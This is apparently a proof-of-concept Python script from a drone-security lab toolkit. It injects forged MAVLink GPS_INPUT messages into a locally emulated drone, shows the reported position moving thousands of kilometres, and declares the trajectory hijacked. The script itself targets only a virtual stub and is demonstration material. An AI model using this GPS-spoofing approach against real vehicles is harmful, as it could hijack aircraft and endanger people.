#!/usr/bin/env python3
"""PoC 04 - GPS Spoofing (virtual/local) (PWNUAV NV-01, IM-03, IM-02).

Injects a forged GPS_INPUT against the emulated drone and shows how the reported
position jumps to remote coordinates (trajectory hijack). venv: .venv
"""
from __future__ import annotations
import socket, time
from pwnuav.drone_stub import DroneStub
from pwnuav.link import connect, announce
from pwnuav.gps_spoof import spoof_position
from pwnuav import demo

def _port():
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind(("127.0.0.1",0)); p=s.getsockname()[1]; s.close(); return p

def main():
    LATr,LONr=37.7749,-122.4194           # real position the drone reports
    LATf,LONf,ALTf=6.2518,-75.5636,1500.0  # spoof target (Medellin)
    print(demo.rule("PWNUAV GPS SPOOFING (virtual)"))
    port=_port(); stub=DroneStub(conn_str=f"udpin:127.0.0.1:{port}").start()
    try:
        m=connect(f"udpout:127.0.0.1:{port}"); announce(m); m.wait_heartbeat(timeout=5)
        g0=m.recv_match(type="GLOBAL_POSITION_INT",blocking=True,timeout=2)
        print(f"[*] Baseline position (real): lat {g0.lat/1e7:.6f}  lon {g0.lon/1e7:.6f}")
        print(f"[*] Spoof target            : lat {LATf:.6f}  lon {LONf:.6f}  alt {ALTf:.0f} m")
        d=demo.haversine_km(g0.lat/1e7,g0.lon/1e7,LATf,LONf)
        print(f"[*] Displacement to force   : ~{d:,.0f} km\n")
        print("[NV-01] Injecting forged GPS_INPUT  (fix_type=3 3D, sats=12, hdop=1.0) ...")
        print("        MAVLink GPS_INPUT: gps_id=0 ignore_flags=0 lat/lon=deg*1e7 alt=m\n")
        print("[*] Reported GLOBAL_POSITION_INT after injection:")
        adopted=False; t0=time.time()
        while time.time()-t0<5 and not adopted:
            spoof_position(m,LATf,LONf,ALTf)
            msg=m.recv_match(type="GLOBAL_POSITION_INT",blocking=True,timeout=0.5)
            if not msg: continue
            dt=time.time()-t0
            adopted = abs(msg.lat/1e7-LATf)<0.001 and abs(msg.lon/1e7-LONf)<0.001
            print(f"   t+{dt:4.1f}s  lat {msg.lat/1e7:>11.6f}  lon {msg.lon/1e7:>12.6f}   {'<- ADOPTED' if adopted else ''}")
        print()
        if adopted:
            print(f"[IM-03] EKF/home now believe the vehicle is ~{d:,.0f} km away.")
            print("[IM-02] In flight this trips the GPS/geofence failsafe -> RTL / trajectory hijack.")
            print("[+] POSITION HIJACKED with a single unauthenticated GPS_INPUT.")
        else:
            print("[-] spoof not adopted")
        m.close(); return 0 if adopted else 1
    finally:
        stub.stop()

if __name__ == "__main__":
    raise SystemExit(main())
